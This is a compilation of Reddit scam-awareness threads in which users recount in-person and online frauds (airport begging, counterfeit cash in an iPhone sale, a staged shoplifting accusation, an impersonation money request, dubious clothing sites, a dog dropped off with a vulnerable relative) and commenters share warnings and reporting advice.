- To deal with the guilt from uncertainness, first be kind to yourself and know you trusted your gut in that moment. Then give that generosity in another way such as paying for someone‚Äôs groceries or donating to a cause. This gesture comes from the good and generous place inside of you, not when you are being pressured. Lastly, put a good thought / well wish into the universe for that lady regardless of her motivation that day.
- Can someone explain how do you send money to yourself and then‚Äùgive her the code‚Äù‚Ä¶ I have no clue what that means.
- 65% sure? ü§®
- She knew a sucker when she saw one.
- I think what frustrates me is that there are people legitimately out there that have been stuck in situations and need help. And they get turned away because of scammers like this or they are not helped in a very stressful situation because people are so wary of being scammed and it‚Äôs absolutely ridiculous because it‚Äôs hard to know who to help and who not to help but sometimes you gotta go with your gut because I‚Äôve helped people who I thought would legitimately need it that I later found two weeks later, telling someone the same exact story, and the same exact place, claiming that they just needed to get home and they had just been driving through that day -And people that really needed help that I turned away because they weren‚Äôt raggedy looking enough or they didn‚Äôt look desperate enough. it breaks my heart that this is even necessary for people. And it hurts my heart that there are people out there taking advantage of this..
- The "need money for diapers" with no child in sight is a pretty common scam. My approach to this is to give a small amount - like, $5 or $10. Basically, an amount where I don't really care if the story is true or not. I figure it's not easy being forced to ask strangers for money, and anyone who does it is in a not-great situation.

That said, I would not give a larger amount; instead, I donate regularly to reputable organizations that serve homeless and low-income populations. In my area, that includes the Coalition for the Homeless and a number of halfway houses and residences for women with children who are fleeing abusive situations. 

Everyone makes their own decisions about this but don't let anyone tell you that giving money to a beggar makes you a sucker or a fool. It makes you someone who's willing to help even if sometimes you get played. That's honorable.
- Right if you needed a baby formula, this would be something you would do at the store that they sell it.Not at the airport
- She may have figured that people at an airport are usually in a hurry to get somewhere, and not in a state of mind to stop and consider the situation carefully, so they'll just hand something over to be on their way.
- But ‚Ä¶ he gave her the üí∞
- This and the "Good Christian" stuff. A lot of the scams that I have come across recently used that exact wording.
- The answer is NO! No is a complete sentence. These people would steal the gold teeth out of your mouth and the gold teeth out of your grandma's mouth! Never feel guilt, they're thieves and scammers.
- Your FIL sounds sharp
- We used to have scammers that would beg in the parking lot of the local walmart on a specific island. They would bring their infant and children with them in the 90+ degree humid Illinois Summers and claim that they didn't have enough money for food for their kids, but would absolutely refuse me when I would  give them numbers to call to get assistance (our state will even give you bus fare or free rides to the welfare offices) and I once saw them walking across the parking lot getting into a newer looking luxury SUV. When I talked to them about a friend, they told me that they have called the store to complain but the place that they beg at is part of city property and not owned by Walmart and the city doesn't really care to do anything about them. I really feel they go to this exact location on purpose. 

I mean that's before I even talk about the people who will just come up to you and ask you to buy their groceries for them in the store itself; it's mostly families but I've also seen older people in the store's motor scooters flashing signs at me and others asking to pay for their groceries.
- >knows the best way for me to send her cash."


Yeah, I might have still been undecided but as soon as she rolls out the 'way to send cash', üòÖ
- DesertStorm480 is right!  The "ambush" technique is designed to catch you off guard so you don't engage with your ability to analyze and use. logic at that moment. The scammer wants to inconvenience you. Often, they are distracting you from seeing their accomplices, who linger nearby and may even cause you physical harm.

For those following this thread, please don't give a code and then cancel it. The scammer you're talking to can get the code word or number to an accomplice, who claims the money and immediately send it to another scammer. This is so that even if you call your bank to stop the charge, the bank can't trace it beyond one or two layers of movement. Don't engage, say no, and keep walking.
- This!  If you are feeling like 100 bucks is no big deal, please make a donation to a women‚Äôs shelter; better there than to a scammer.
- This!  Any time someone is asking for money it‚Äôs a scam. Just say ‚Äúno thanks‚Äù and walk away.
- Good for you! Saved that kind person from being scammed.
- I‚Äôm puzzled how they run these scams in the cleared area.

Had something similar a decade ago, and it was a guy with a duffel and he said his flight was super delayed and so they weren‚Äôt getting to their location on time, they didn‚Äôt have enough money for food, kid was hungry, etc.  He asked for money and I said ‚Äúsure, can I see your boarding pass?‚Äù  and for the next 5 minutes the guy pretended (I assume) to scroll through his beat up phone and look for where his boarding pass was.
- >she didn‚Äôt want diapers

I'm wondering what folk did before there were disposable diapers? well if you're that poor you'll do as they did for 1000's of years, no?
- Retail/pharmacy manager here!

Taking the barcodes off the package is better. Places will take back opened products but they can't take them back without the barcode to scan in on the package. And don't give the receipts.
- I wouldn‚Äôt even waste my time
- Core memory unlocked from my travels in the '70s abd '80s. The Hare Krishnas were allowed to roam freely through the airport handing out pamphlets and flowers in exchange for a donation. Eventually, they were confined to a cordoned off area in the terminal and could only hassle passers-by. I don't remember when they were finally kicked out of the airport.
- But all you‚Äôve done is encourage more begging
- That‚Äôs what I thought too.
- If you read closely, he gave her the code and then cancelled the transaction.

I'm not familiar with this approach to banking, but they seem confident no actual cash changed hands.
- He said he cancelled it
- Exactly. This was a total script from beginning to end.
- It's been like that for years.  There was a guy at the Walmart by my parents place who would walk around the store bugging people every day saying his "church van" was broke down and needed money to fix it.  100% it's a scam.
- No need to tell me.
- Yup, it‚Äôs all an act. There was a lady who used to shove a pillow under her jacket and pretend to be pregnant, never mind the fact she looked 50+. Other times she‚Äôd be dragging a toddler around in half a foot of snow. What she didn‚Äôt know is I lived in the next apartment over from the local crack dealer. Exactly where she‚Äôd stop people and beg for money for ‚Äúfood for her kids‚Äù.
- Mexican Gypsies do this in Oklahoma.
- I don‚Äôt know how he would have gotten past security. Both of the incidents I referenced were pre security.
- Classic bad response. People who are begging don't need encouragement.
- Thank goodness ‚Ä¶ üòä
- It's so sick to me when people exploit their kids this way. They shouldn't be out in those elements. I'm a mother of 3 and we lived in a hotel for 2 years due to having to wait out an old eviction that I had on my credit history and not making enough to meet the 4x income requirements for all of the properties in my area and I NEVER did anything like that.

Title: Got scammed by accepting counterfeit money when selling a new iPhone in person
Body: Went with a friend, didn‚Äôt give him time to confirm the bills and before you know it, the scammer took the sealed iPhone and drove off. I learned my lesson now and know I‚Äôm an idiot for giving the phone before confirming ‚Äî expensive learning lesson 

The thing is we met in front of a Chase bank that had tons of cameras, his FB profile he messaged me from, and description of him/his vehicle. He also had his bare hands on the envelope with the fake cash.

I filed a police report immediately. Do police actually go after a case where it‚Äôs theoretically possible to catch this guy + being felony level? Or do I say bye to my money and assume nothing happens.

- Counterfeit is a pretty significant crime and has federal implications. Depends how busy the police department and local usss office is in the locality (I imagine the secret service are... pretty busy).
- If counterfeit money is involved, police will be extremely interested - they are far more interested in that than in scams. Assume you handed over the counterfeit money to them, and gave them the details of where the transfer took place.
- If i sell something expensive, a car, phone, etc., i will only make the money exchange at a bank during business hours. Funds will be deposited in my account and title signed over after the teller accepts the funds.
- It might get some traction as they used fake money as real currency, but actually getting  money back, that's probably a no. If I had to guess they are probably selling it to somebody else to get the money. Do a search for new Iphone for sale, you may see it and set them up with a friend or something.
- Virtually the same scam 8 days ago, perhaps comments/advice are equally valid for yours:

[https://www.reddit.com/r/Scams/comments/1i3qtpo/just\_got\_scammed\_with\_counterfeit\_cash\_from\_fb/](https://www.reddit.com/r/Scams/comments/1i3qtpo/just_got_scammed_with_counterfeit_cash_from_fb/)
- For a new iPhone always meet at a police station to avoid criminals.  Cameras alone are not a deterrent.  Should never have handed the phone until money was confirmed.  This is 101 stuff.
- In the US it‚Äôs the secret service that investigates counterfeit money.
- If this happened in the US, in addition to the local police you can notify the US Secret Service - put the bills away and stop handling them in case they want to analyze them for fingerprints - keep anything the person gave you even the envelope the bills were in, if there was one.

I would also, if possible report the phone as stolen with Apple.
- Do you have a currency tester pen?  If not, get a pack.     
Go look up some videos on how to confirm the validity of various bills.  

  
If you are going to buy or sell on FBM, hang around this subreddit for a few weeks and read every post.   

You will quickly learn to recognize red flags for many types of scams.
- The Secret Service handles counterfeit bills. They treat this very seriously.
- Call the local US Secret Service office
- *The U. S. Secret Service wants to know his location*
- All you had is CCTV of him handing over money to you. If he claims he gave you real money, how are you going to prove otherwise?
- How did you eventually realize the money was counterfeit?
- The secret service deals with counterfeit $. You could try and contact them too.
- You're supposed to have the bank count the money. If they were honest, the buyers would have allowed it.
- In some states it is unlawful top possess or utter counterfeit currency.  So it could well be a crime at the state level.

But good luck getting your local police to work such a case.  Where I live the police cannot even fill an academy class ever since the war on police began in 2020 - and in fact will not even promptly respond to a burglary call unless the burglars are still in the house at the time of the call.

Because of the threat level against the current president and the resources needed to provide protection, I seriously doubt the Secret Service will investigate your case unless it can be demonstrated that the bills themselves are of some insanely high quality level.
- my area has a pretty low crime rate so i‚Äôm literally hoping that the police have nothing better to do and this is actually something they‚Äôd pursue. they even told me that i‚Äôm a victim of a felony crime because of the amount. hopefully they get the pos
- As significant of a crime as it is, doubt they would put effort into it unless there were more reports. One case is  probably not enough to put any effort into
- yep, gave them the counterfeits, emailed nearby stores that had cameras to send footage to police (and requested police to check in with them + Chase), and linked them the facebook profile. 

i‚Äôm just wondering if police will actually pursue this case or call it another cold case with all other thefts.
- no worries, i‚Äôve accepted the money being gone. but i‚Äôd still want the scammer getting charged. 

is the scammer just confident that he‚Äôll not get caught if he was willing to 1) show his face on cameras 2) give us money with his bare hands 3) message us via his facebook
- Fingerprints + DNA expertise + Remaining traces both on his clothes and other objects. Actually a lot of ways to prove it.
- Wait, you‚Äôre saying the reason local police won‚Äôt look into a minor counterfeit case is because you think they need to divert all their resources to protect the Great Orange Clown? Take off the tin foil hat.
- My husband will occasionally list something to sell on Marketplace. I am just curious, how did you realize the cash was counterfeit? Are folks just out there making colored copies of bills using regular printer paper, or are the bills being printed on a specific type of paper? I would think that making bills that look & feel like currency would be a major type of criminal activity - one the average joe doesn't have the means to pull off convincingly??? I've told my husband the information I learn here  - cash only, he's not a bank, to never go off the platform, etc. But how do I explain to him that someone might try to give him counterfeit bills? Nothing he sells, though, is expensive  - typically $50 or under, and it's rare he actually puts something on there for a price - he just lists it for free so he can get rid of it (like an older refrigerator when we bought a new one) - but he's always thinking about selling this or that & seems curious about how much he can get for something. I obviously don't want him scammed, but I swear, with all the different types of scams out there, it's just a matter of time before he becomes a victim of one üôÑüò°. TIA for anything anyone can tell me ‚ò∫Ô∏è
- It falls into federal so local cops won't be looking into it if they take the case up to them.
- In my experience, find out what detective was assigned to your case, and call him every couple of weeks for updates. Reminds him to keep it on the top of his work pile.
- I would potentially also reach out to the Secret Service as they‚Äôre the branch that over over sees  counterfeit money
- What should happen is the police should contact the U.S. Secret Service. They are in charge of counterfeit money (I don‚Äôt know if it‚Äôs common knowledge that the USSS is part of the Treasury Department.) how did you contact Chase? I would go in and talk to the bank manager. O think they‚Äôd be interested in someone conducting business with counterfeit money in their parking lot, and would be happy to give law enforcement any footage.
- 1) Since facial scanning and recognition throughout our entire society isn't a reality (yet), the chances are very low that it would help.

2) The "money" has been contaminated by now with the DNA of everyone who has handled it, including you. DNA analysis is expensive and I seriously doubt a law enforcement forensic laboratory would even listen to your plight.

3) Anyone can be anyone else on FB. You were probably dealing with a fake profile. If you can convince cops to issue a search warrant to FB they might be able to do something.

Bottom line...you got taken.
- The bare hands thing is kind of moot. It would be almost impossible to pull an identifiable print that would point to the thief- and that‚Äôs assuming the subjects prints are even on file.

You can contact the feds as well, you‚Äôd be less likely to get an investigation but it‚Äôs better odds in your favor rather than just contacting local PD on your own.

Honestly your best bet is finding the thief reselling the phone and setting them up. Dangerous, but I prefer to be involved with stuff like this than in the hands of some investigator who may or may not GAF.

Sorry that happened to you.
- Was he really the guy in the photos on the Facebook profile? You can take screenshots and reverse search him on Facecheck.id or pimeyes and see if he has other profiles in case the Facebook one had a fake name.
- He didn‚Äôt murder anybody üòÇ Highly doubt they‚Äôre doing any type of forensic testing for something like this lol
- I will try to dissect what I wrote for you:

The Secret Service is too busy protecting its protectees these days to make a major case of somebody getting scammed with counterfeit currency during an iPhone sale.

I said nothing whatsoever about the local police not working a case because of Trump.  Nothing.

Glad I could help you understand what was actually written.
- I saw on one of those reality shows about customs / border enforcement that some pretty convincing counterfeit currency is coming out of South America - I think they seized $100K worth of $100 bills from a passenger on an episode I saw
- I‚Äôve got a few over the years. Some you can tell as soon as you touch it, like you said paper feels way different than what they print money on. The ones that fooled the most people where $5 bills that they washed and printed $100. The bill felt off when I went to spend it so I mentioned it to the shop owner. He held it up and saw the watermark and the little strip and figured it was real. He noticed after I left what it was and I went back and gave him more to cover it. All it takes is paying attention to the actual watermark, had we taken another few seconds we would have seen that watermark was wrong for that denomination but if you just take a quick glance and are more familiar it may not register.
- What is the point ? If they want, they can put him in jail easily.
- No, I got it, thanks. I was inferring you have no proof of what you‚Äôre claiming, which you clearly don‚Äôt.
- Def not ‚Äúeasily‚Äù‚Ä¶It would be thrown out if it went to court. If they were on camera, it would show them exchanging the phone for money. OP took off with the money and found out later it was fake. Who knows if they‚Äôre not the ones trying to scam the buyer and accusing them of paying with counterfeits? It‚Äôs just ‚Äúhe said, she said‚Äù at this point, and hearsay is not admissible in court. 

As for the forensics, it‚Äôs hard to lift a fingerprint under perfect conditions, it‚Äôll be impossible to even get a partial print clean enough to check off paper
- Okay.  If you think the local police are gonna make a major case out of you getting scammed out of an iPhone - go right ahead.

Adios bro.

Title: strange retail scam from early 2000s: is this still a thing and has anyone else experienced such?
Body: Years ago I was shopping at an Abercrombie in Orlando (this is back in the early 2000s when they were all the rage). I knew the store manager there as it happened through mutual friends. But I didn't speak with him when I went in though I later caught him out of the corner of my eye walking in the back of the store like back to the offices or whatever so I knew he was there. I got my shorts and T-shirt and went to buy them. As I was standing there, I noticed the sales associated slipped what looked like a lady's top into my bag. It was very deliberate and clear that he tried to do it without being seen. Weird. So I told him "oh man, I forgot I wanted to get another shirt" and I went back to shop a while and got another tee to buy. He rings me up for for the new shirt, he puts it also into my same bag. When I went back for the tee, I found my friend the manager and asked him come up front and watch things and not act like he knows me and he did. I also told him about the girl's blouse being slipped in. Sales dude has all four garments in the same bag, two receipts, one showing shorts and a tee, the other just the second tee. 

I proceed to leave the store and the sensor alarm goes off. I come back to the sales counter, my friend the manager is around the corner just out of sight but listening. The sales boy makes a big show about how I was caught stealing but we can figure out a way to settle things without calling the cops plus it's really embarrassing he says because I tried to steal an XL girl's top so what am I doing with that anyways, hmmm? The manager walks over, plays dumb, asks what is going on. The associate tells him about an attempted theft and finally the manager explains I told *him* beforehand that the associate put the blouse in the bag and set it all up. I don't know what happened beyond that, I saw the manager again but he said he really shouldn't talk about it. Certainly, it seemed the whole elaborate thing was an attempt to extort or blackmail somehow, to get a cash bribe in exchange for not calling the cops or some such. Just an example of how weird scams can go.

- Have not heard of that one.  With cameras everywhere these days, seems like it would be hard to pull off.  Any employee trying this wouldn't last long, as they could earn the company a major lawsuit.
- It sounds like a strategic diversion. Cashier was doing some shady things on the side during his employment, and in order to make sure he wasn't looked at too closely over the year, he arranged to be a hero by loudly 'catching' a shoplifter. 

So not only is he being lauded by management and maybe given a raise, he's also shown to really be conscientious and care about his store....he's certainly the last person they'd suspect of smuggling goods out in a backpack he's stashed away while working...
- I wondered about cameras. This was around 2000-2001. I would think Abercrombie would have had ample cameras, but possibly he blocked the one watching check-out as it seems he turned sideways with the bag, grabbed the blouse from under the counter, and very quickly dropped it into the bag. I just happened to catch it. But I wonder also about the risk with the alarm going off, when he was trying to get me to do whatever even had I not already alerted the manager the alarm likely would have gotten a key-holder's attention I'd think. And I'd think any customer would have asked to see a manager if an employee pulled this. The whole thing was super-strange. I just wonder if there was a scam around at the time like this or just one really weird Abercrombie kid trying something?
- Sounds like some weird Abercrombie kid who wants to "work things out" with you in the back room.  Good thing the manager was able to take care of it.
- It's not a scam the dude was a creep and was trying to blackmail you. The fact you hadn't figured this out in 20 years is baffling.
- I figured out he was trying something shady, my only question over the years has been: was this a one-off this one dude did or a scam at the time going around?
- In the couple years I‚Äôve been subscribed I‚Äôve not heard this yet. It seems like a method of getting caught quickly
- I tend to agree. I figure it was just a quick and dumb action by a bored college kid. But I wondered if‚Äîespecially circa 2000 when the internet was very different and most people didn't have cellphones‚Äîif there was some similar scam popular that inspired what he tried.
- Back then, Abercrombie chose a lot of its salespeople for their hotness. You would think this guy would be satisfied with that already going for him and not have to scam a few bucks from customers.
- Eh, I don't know. I was kind of the hot Abercrombie kid too then and I don't think I ever woke up thinking "gosh, I have tons going for me" . . . I think if anything you want more and the type of environment Abercrombie was back then also encourages wanting more. I wonder now if he mostly may have done these antics out of boredom and for his amusement.

Title: My "ex-girlfriend" tried to scam me, but I realized something kinda important.
Body: My ex-girlfriend "K" and I broke up, after five years, we could no longer make it work, and after another bad argument, we separated. 

Five months have passed and out of the blue, I get a text. When I read the text it was supposedly from "K". She told me her 12-year-old son was in the Hospital ICU. She legitly has a son who is mentally impaired with partial brain damage. He has 24 hour nursing along with a feeding tube and a trac for O2. She then asks if could please help her. She needed to pay $600 to pay the hospital for the treatment or he wouldn't make it. I know he has insurance and gets Medicaid, and also the hospital wouldn't let a 12-year-old pass away like that. When I said that to her she got mad and said send me the money. They sent me a CashApp but it wasn't hers, it was some guy. According to her, it was her friend's Husband CashApp. I called twice and ignored it and they text and asked if I was stupid for calling and don't call the number again.

Then all of a sudden I snapped about something. My ex was born and raised in Mexico. Although she understands English, she can't speak it fluently, it's all broken English, so she prefers Spanish. In the five years we were together, she never once text English; she always texted me in Spanish. This person was texting me in English. So I asked if the cashapp was Jane's Husband. There is no Jane I just made up that name and the person said yes

I told the person they were an idiot and if I catch them I was gonna beat their ass for pretending to be K and bringing her son into it. They immediately blocked me. Later that day I got a text from Ks daughter. She apologized to me because the person who texted me was her mom's new boyfriend. She told me was just a lowlife and into the drugs, all he would do was be a bum at the house. I did call a friend who works at CPS and they're gonna do an investigation too.

- There is frankly no ‚Äútreatment‚Äù that would make the difference between living and dying and only cost $600, but not be covered.
- If what the daughter says is true, that boyfriend is one vile son of a bitch, and your ex needs to know what kind of person she got involved with.
- Hospitals are required to provide lifesaving procedures as needed, and cannot demand payment up front for something literally life or death.
- Correct me if I‚Äôm wrong, but  I believe that the following comments made, were people who don‚Äôt really listen to what you‚Äôre saying. If I read this correctly ( and I mean between the lines) it sounded like you wanted to let us ( the readers) know what happened to you. I don‚Äôt think you were asking for any advice?( I could be wrong), it sounded like you just simply wanted to share your experience with this scammer-guy. And share with us how you found out, bc it didn‚Äôt sound legit to you, then you used your logic; and you realized this guy was somehow connected to your ex and you caught him and let the daughter and ex know this what the ‚Äòboyfriend‚Äô was doing to them. 
I commend  the way you went about it. Sounds like you care an awful lot about this family. Especially the young daughter who had been ill. 
Thank you for sharing. If I‚Äôm wrong, my apologies to you
If I‚Äôm not wrong,  then those of you who think they know it all, about ER‚Äôs, scams, etc, quit putting down the experience this man had, or any other persons experiences. 
I didn‚Äôt for one moment think this guy didn‚Äôt know what he was doing!!  
It‚Äôs really not difficult to be kind! 
Am I naive and an idiot??? No I‚Äôm not.i am hopeful and believe in others. 

I‚Äôm a person who usually sees the glass half full. Not 1/2 empty. 
But I‚Äôm human, and I‚Äôve been waaaaay wrong before (most times, I‚Äôm in ballpark tho.)
- Are you sure it wasn‚Äôt the daughter scamming you? How confident are you that ‚ÄúMom‚Äôs new boyfriend‚Äù even exists?
- Why would you even call their bluff? You're teaching them. Block a scammer, always. And if you're interested in seeing if this is her, call her or move on with your life 

Never teach a scammer.
- After my father passed away, a man approached me in the street, claiming to be my father's work friend and asking to borrow two hundred euros to attend a funeral. (edit: i.e. another funeral - not my father's.)

I asked if he played soccer with my father on the company team and he said yes. My father never played soccer and there was no company soccer team. I didn't want to confront him out of fear he might turn violent, so I told him I was unemployed and broke. I reported it to the police but nothing came out of it. I never figured out how he knew our names.
- Bien hecho!  I love it when there are ‚Äúwins‚Äù posted to this subreddit!
- If I help someone, I pay the bill, service, or buy the commodity directly.  Also, paying this bill or a portion of it will entitle me access to medical records or no dice.   

So it doesn't really matter if it's a scammer or not as a scammer would not follow through with this.
- I hope u know that kid loves u so much!
- Dude sounds awful

How do chicks fall for such obvious trash? üòÜ
- [removed]
- Wow, what a crazy situation. It‚Äôs honestly messed up that someone would use a child‚Äôs health to try and scam someone like that. The fact that you caught the red flags‚Äîlike the English vs. Spanish thing‚Äîwas spot on. 

Hospitals wouldn‚Äôt refuse life-saving care for just $600, especially for a child. I‚Äôm glad you figured it out and are bringing attention to it. 

Hopefully, others can learn from your experience and stay alert for similar scams.
- How old is the daughter?  Sounds like she may have been trying to make some money and threw an imaginary boyfriend under the bus. How would she know what he was doing?  Or this is all just mad fake.
- No kidding! I got billed 600 for a single Pepcid when I was in the hospital. Everything is suuuuuper inflated, nothing critical is that cheap.
- *cough* insulin *cough*

People literally die because they try to stretch insulin because they can't afford the deductibles. 

This story was clearly a scam, but people do die from like $600 to $1000 charges they can't afford.
- Yep. You might end up bankrupt but emergent medical treatment is not dependent on payment in the US.
- >If I‚Äôm not wrong, then those of you who think they know it all, about ER‚Äôs, scams, etc, 

I figured many of them were saying this for the benefit of others who may not know, not necessarily saying it to OP.  

Obviously OP knew this smelled funky so he wasn't scammed, but others in a similar situation may get panicked not knowing that an ER won't kick someone out with a life-threatening situation unless they paid $600, cash on the spot.
- No she's not, she's 15 and I've helped raise her since she was 9 years. Their dad was never in the picture, I was practically the only dad they've ever known.
- Because this wasn‚Äôt some random scammer from Nigeria or something. If you read the post, it was very personal.
- Federal HIPPA laws do not grant access to medical records because you contribute to the bill, in this case access would be limited to the minor child, legal guardian and people the guardian authorizes.
- **This submission was manually removed because it was posted by a recovery scammer.**

Don't trust what you just read, don't try to reach out to "hackers" on Instagram or Telegram. Scammers will also try to reach out to you via DMs saying they know a professional hacker that can help you, for a small fee. They're actually trying to steal your money.

You can help us reporting more messages like that, don't just downvote or insult them. If you report them, we will take care of every recovery scammer that pops up.

**Remember: Never take advice in private,** because we can't look out for you. If you take advice in private, you're on your own.
- And nothing that critical, when it comes to a child, is neglected because of money.
- my teenager keep stealing my credit cards while I sleep. I just had to replace another one. I am a single mom, he has never met his dad but my son just cant stop stealing from me. he is 18 now and does not live with me at the moment due to this.
- Dude. It's the teenager. Teenagers do stupid shit. How would new drug addict boyfriend know all these things, have the phone? Also...just the language. Sorry but only a dumb teen is going to think 600$ would keep a kid from dying because they're dumb and don't know about insurances and medicaid.
- Unless K's daughter is also a scammer.
- So? Why show his cards? "AHA THERE'S NO JANE!" and then describe the family tree to the scammer. Bad move. Scammer will refine his speech.
- *HIPAA
- Yes but the legal guardian can give me access and if they are so desperate for me to pay they will be fine showing it's necessary before I hand over $.
- They‚Äôll just throw it onto the parents name and destroy their credit when they can‚Äôt pay
- Maybe consider programming the card into your phone and keeping the physical card some place he can't get to it. I'm sorry you are having to deal with this.
- Or a dumb junkie. Sounds like something an idiot would do.
- wouldn't the teen be smarter and say we need food or something else less serious (I need money for school)? Like kids made scam but they wouldn't be crazy enough to do such an elaborate scam and then use this man's cashapp instead of their own.
- The whole needing $600 or the hospital would let the child die thing is dumb as fuck, but I'd wager that that you could find plenty of dumb adults on reddit and insta who would believe it.

People on this sub tend to be more skeptical by the nature of what it is, but the adult population in general is not that bright. Like everyday, we see stories about people who have fallen in love with Elon Musk or Brad Pitt over facebook and how they desperately need to send them giftcards or crypto before they can meet in person.
- Never underestimate the stupidity and desperation of a junkie.  

The worst part of junkie stupidity is that they think you're dumber than they are.
- The daughter would know there's no friend named Jane.
- Sure, teens do stupid shit, but a 15 year old is unlikely to have some random guy's CashApp. I don't see why a shitty new boyfriend is at all unlikely.
- While I 100% agree about not educating scammers, I can't actually find a sentence that specifically says he told him anything other than that he's an idiot. Where did he say he revealed there is no Jane to anyone other than us?
- You might give some villain monologue explaining your plan to people. Most don‚Äôt.
- Health Information Patient Privacy Act
HIPPA
- Plus the daughter would know the mom speaks in broken English/ Spanish only in texts
- Wrong. Health Insurance Portability and Accountability Act of 1996.

Title: Fireladyfurclothing.com fake tracking?
Body: Hi guys so I ordered a coat from this website stunning website, beautiful coats seemingly.

They sent me a tracking and 17track.net

I noticed it stopped updated last week so I emailed them and then yesterday I got a tracking saying they attempted delivery yesterday, and customer was not available. However my mother in law was home all day and she knew to sign for any package. In fact I got a different package from UPS she signed for. Anyway, I looked on my ring camera and no other shipping company came to the house. I have checked the whole day and nothing. I also screenshot the exact time stamp they claimed to have attempted delivery. 

Did I get scammed? The coat wasn‚Äôt cheap and I did use my credit card but I want to know what you guys think of the website etc?

Thank you!

- On one hand it's a new site, but they registered it for several years. So, at this point it's inconclusive. Just wait a few more days, then file a dispute.
- Does it matter? You paid for something, and didn't get it. Whether the site is fraudulent or simply incompetent is beside the point. Go to your credit card company and file a dispute, saying that you did not receive the item, and there's no proof of delivery.

And next time, if you're going to order something from China, pick a company that you're familiar with or that you know the history of. The site you selected is less than a year old, and could easily be a fly-by-night outfit.
- What‚Äôs the snark about? Of course it matters. Either there‚Äôs a product that‚Äôs going to be delivered or not. Yes my dispute is filed. I do business with Chinese companies all the time, for over ten years in my industry I have never had an issue. I find most Chinese businesses just want to sell their products not scam people. But the point of the post is to get feedback and alert others.

Title: A jacket from Jacket Hub seems a bit fishy to me‚Ä¶
Body: The jacket I‚Äôm referring to is the Resident Evil 4 Remake Leon Kennedy Bomber Jacket from the website Jacket Hub. I‚Äôve been wanting to buy that jacket for a while, especially a good quality one at a cheap price. When I looked up the jacket, one of the first sites that came up was the Jacket Hub one, so I assumed it was a legit one. However, the huge discount it had, as well as the suspicious near perfect reviews it had(16 out of 17 reviews were 5 stars) made it a bit suspicious.

Which is why I need to ask: For those who bought this Leon S. Kennedy RE4 Jacket from Jacket Hub, was it a scam or not? 

I‚Äôd really like to know because I‚Äôm trying to buy a RE4 Leon jacket and this was one of the first results that came up when I searched for it.

Title: A woman showed up to my MIL‚Äôs claiming MIL was listed as a dog boarder
Body: So my MIL has a rental for the past 5 years and it‚Äôs very remote (like you can‚Äôt see it from the road) and this morning a woman came down the driveway and rang her doorbell asking to speak to her and said her information was listed for dog boarding on care.com and said the address (which it‚Äôs not a hard word to say but she fumbled the pronunciation anyways) and long story short my MIL agreed anyways to watching this random woman‚Äôs dog. 

I have a feeling this is definitely a scam because no one in their right mind would just show up to someone‚Äôs house without calling or verifying anything and even after my mil said she‚Äôs not a boarder asks her to watch her dog(s) and be willing to give your dog to a random person you don‚Äôt know. To top it off I can‚Äôt find a listing for MIL on any websites like care, rover, fetch!, etc. husband and I have a bad feeling about this but has this ever happened to anyone else?

Edit: yes I am absolutely concerned why my mil decided to do this. She had pretty harsh chemo treatments over the 5 years she‚Äôs been living at this rental and it‚Äôs definitely affected her mentally. She falls for scams all the time: she‚Äôs almost fell for the infamous iTunes gift card payment if I didn‚Äôt tell her it was a scam and stopped her from leaving. She takes anything a random says as gospel. I don‚Äôt know when she‚Äôs set to watch this dog and she doesn‚Äôt have it in her possession right now. As far as any contact info she has on this woman idk, she only talked a little bit to my husband about it

- > agreed to watch rando's dog

Holy hell. Teach her to say "no" and / or "I'm calling the police get off my property."
- It has to be a scam because scammers are really good at putting pressure on people to do things like this. Here‚Äôs my prediction. Someone is going to show up and demand the dog, your MIL has already proven that she crumbles under pressure so she may be threatened with bodily harm. They take the dog. The woman who left the dog originally will come back, freak out that MIL let the dog be stolen, and then force your MIL to give her how ever many hundreds of dollars the dog supposedly costs.
- >no one in their right mind would just show up to someone‚Äôs house without calling or verifying anything

I think the same could be said of your MIL! No one in their right mind would take in a dog from some random woman who showed up at their door! WTAF? 

I would take the dog to a vet to have it scanned for a chip. And have a backup plan if this woman never shows up again.
- What in the hell. Your MIL needs to contact this person back and/or just take the dog to a shelter.
- There might be something seriously wrong with your MIL... her family/your spouse need to look further into what is going on with her mental state given such an apparent lapse in judgment.
- You need to contact the police and let them know what happened.  A lot of departments have a scanner for a chip or they can tell you who to contact.  

This sounds like a stolen dog scam.  There are several ways this can play out, but the last thing you want is an irate owner tracking down your MIL and claiming she stole the dog.   

Ask the police what to do with the dog.
- You might need to get that MIL checked out because wtf is she doing?????
- If she doesn't currently have the dog, then all you need to do is be sure that she doesn't give any personal info to this person if they surface again, and says she changed her mind. Shut down the entire transaction and close the door.

You might contact the AARP fraud help line - not about this dog thing, but it sounds like your MIL is very vulnerable. There are steps you can take (with her consent) to protect her assets and identity from scammers - such as getting cc'd on emails, setting up filters on her phone, putting her money in a trust, etc. It's work, but less work than trying to dig her out if she gets nailed by a really big scam. This is your wake-up call.
- "She takes anything a random says as gospel.¬†"

Time to get a guardianship/conservatorship over her immediately.   She is incapable of making her own decisions.
- I'm thinking that calling the local police and ask if this has been reported before. It may have been tried elsewhere locally and is the precursor for a B&E.
- 1. Steal a dog.

2. Feed it chocolate. 

3. Drop it off with a "pet sitter".

4. Show up later to find a dead animal.

5. Offer to take $500-$1000 instead of taking the victim to court for negligence.

6. Wash, rinse, repeat.
- Chemo Brain is brutal. Does MIL live by herself? Maybe she shouldn‚Äôt be?
- Call the police and the local veterinarian or shelter.  No responsible pet owner just drops off a dog at a random address that says ‚Äúboarding‚Äù with no appointment or discussion.  This has scam written all over it and the dog could be stolen.
- Sounds like someone dumped a pet dog, possibly a stolen one.

Could be a scam, if the person later claims that MIL stole the dog and needs to pay hush money to not get in trouble. If it turns out to be that, you can call the police and cut off contact with the scammer.

It sounds like MIL didn't even get real contact info for the woman?

More to the point: the poor dog may belong to someone - it may have been stolen. You could take it to a shelter or vet to check if it has a microchip. If not, the shelter can try to find its owner.

Edit: there are scammers who pose as pet sitters for a fee. They take the fee and then dump the pet on the street. This happened to someone I know with a cat - she didn't realize the cat was missing right away because she was traveling. Amazingly, the cat was found after a week on the streets of NYC. The fake sitter was long gone with the money.
- "Jimmy, we gave the dog to a farm where it is now running and playing with the other animals, having fun."
- Suggesting this as gently as possible because I hope to not cause any offense‚Ä¶ are you certain this actually happened? I have experienced people who are seriously ill or in long term hospital care having some very detailed hallucinations. When a story sounds this strange and the person has health problems, it feels like a possibility. Something as simple as low sodium can contribute.
- Your MIL sounds like she should never make any decisions about anything without speaking to one of you first. Her level of gullible is scary. Falls for multiple scams? Oh dear Lord
- Is there any mention of payment or is MIL supposed to be doing this for free?
